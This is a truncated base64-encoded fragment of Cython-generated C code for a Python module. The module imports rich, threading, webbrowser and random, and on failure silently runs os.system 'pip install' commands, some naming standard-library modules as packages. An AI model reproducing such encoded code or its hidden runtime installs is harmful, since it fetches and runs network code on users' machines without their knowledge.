kVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgZ290byBfX3B5eF9MNjNfdHJ5X2VuZDtcbiAgICBfX3B5eF9MNThfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8zLCAmX19weXhfdF8yKSA8IDApIF9fUFlYX0VSUigwLCA0NSwgX19weXhfTDYwX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzExID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCA0NiwgX19weXhfTDYwX2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF85LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG4gICAgICBfX3B5eF90XzYgPSAxO1xuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9waXBfaW5zdGFsbF9yaWNofTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MNjBfZXhjZXB0X2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTtcbiAgICAgIH1cbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwO1xuICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgZ290byBfX3B5eF9MNTlfZXhjZXB0aW9uX2hhbmRsZWQ7XG4gICAgfVxuXG4gICAgXG4gICAgX19weXhfTDYwX2V4Y2VwdF9lcnJvcjo7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF84LCBfX3B5eF90XzcsIF9fcHl4X3RfMSk7XG4gICAgZ290byBfX3B5eF9MMV9lcnJvcjtcbiAgICBfX3B5eF9MNTlfZXhjZXB0aW9uX2hhbmRsZWQ6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIF9fcHl4X0w2M190cnlfZW5kOjtcbiAgfVxuXG4gIFxuICB7XG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9kZWNsYXJlXG4gICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ25cbiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpO1xuICAgICB7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BhbmVsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNDgsIF9fcHl4X0w2Nl9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yaWNoX3BhbmVsLCBfX3B5eF90XzIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDY2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUGFuZWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA0OCwgX19weXhfTDY2X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7XG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BhbmVsLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNDgsIF9fcHl4X0w2Nl9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBnb3RvIF9fcHl4X0w3MV90cnlfZW5kO1xuICAgIF9fcHl4X0w2Nl9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDQ5LCBfX3B5eF9MNjhfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTAgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgNTAsIF9fcHl4X0w2OF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7XG4gICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCA1MCwgX19weXhfTDY4X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX3RocmVhZGluZ307XG4gICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA1MCwgX19weXhfTDY4X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDY3X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0w2OF9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF83LCBfX3B5eF90XzgpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDY3X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfNywgX19weXhfdF84KTtcbiAgICBfX3B5eF9MNzFfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF84LCAmX19weXhfdF83LCAmX19weXhfdF8xKTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkaW5nLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNTIsIF9fcHl4X0w3NF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aHJlYWRpbmcsIF9fcHl4X3RfNSkgPCAoMCkpIF9fUFlYX0VSUigwLCA1MiwgX19weXhfTDc0X2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93ZWJicm93c2VyLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNTMsIF9fcHl4X0w3NF9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93ZWJicm93c2VyLCBfX3B5eF90XzUpIDwgKDApKSBfX1BZWF9FUlIoMCwgNTMsIF9fcHl4X0w3NF9lcnJvcilcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuXG4gICAgICBcbiAgICB9XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgZ290byBfX3B5eF9MNzlfdHJ5X2VuZDtcbiAgICBfX3B5eF9MNzRfZXJyb3I6O1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7XG5cbiAgICBcbiAgICAge1xuICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJvcCIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpO1xuICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8yLCAmX19weXhfdF8zKSA8IDApIF9fUFlYX0VSUigwLCA1NCwgX19weXhfTDc2X2V4Y2VwdF9lcnJvcilcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8yKTtcbiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzkgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNTUsIF9fcHl4X0w3Nl9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MNzZfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcGlwX2luc3RhbGxfcmFuZG9tfTtcbiAgICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCA1NSwgX19weXhfTDc2X2V4Y2VwdF9lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7XG4gICAgICB9XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDtcbiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICAgIGdvdG8gX19weXhfTDc1X2V4Y2VwdGlvbl9oYW5kbGVkO1xuICAgIH1cblxuICAgIFxuICAgIF9fcHl4X0w3Nl9leGNlcHRfZXJyb3I6O1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpO1xuICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfOCwgX19weXhfdF83LCBfX3B5eF90XzEpO1xuICAgIGdvdG8gX19weXhfTDFfZXJyb3I7XG4gICAgX19weXhfTDc1X2V4Y2VwdGlvbl9oYW5kbGVkOjtcbiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpO1xuICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTtcbiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzgsIF9fcHl4X3RfNywgX19weXhfdF8xKTtcbiAgICBfX3B5eF9MNzlfdHJ5X2VuZDo7XG4gIH1cblxuICBcbiAge1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZVxuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xLCAmX19weXhfdF83LCAmX19weXhfdF84KTtcbiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7XG4gICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpO1xuICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTtcbiAgICAge1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNTcsIF9fcHl4X0w4Ml9lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA1NywgX19weXhfTDgyX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG5cbiAgICAgIFxuICAgIH1cbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDtcbiAgICBnb3RvIF9fcHl4X0w4N190cnlfZW5kO1xuICAgIF9fcHl4X0w4Ml9lcnJvcjo7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDtcbiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcblxuICAgIFxuICAgICB7XG4gICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm9wIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7XG4gICAgICBpZiAoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzMsICZfX3B5eF90XzIsICZfX3B5eF90XzUpIDwgMCkgX19QWVhfRVJSKDAsIDU4LCBfX3B5eF9MODRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzMpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzIpO1xuICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzUpO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfMTEgPSBOVUxMO1xuICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDU5LCBfX3B5eF9MODRfZXhjZXB0X2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7XG4gICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDtcbiAgICAgIF9fcHl4X3RfNiA9IDE7XG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X3BpcF9pbnN0YWxsX2hhc2hsaWJ9O1xuICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzEwLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpO1xuICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNTksIF9fcHl4X0w4NF9leGNlcHRfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpO1xuICAgICAgfVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7XG4gICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7XG4gICAgICBnb3RvIF9fcHl4X0w4M19leGNlcHRpb25faGFuZGxlZDtcbiAgICB9XG5cbiAgICBcbiAgICBfX3B5eF9MODRfZXhjZXB0X2V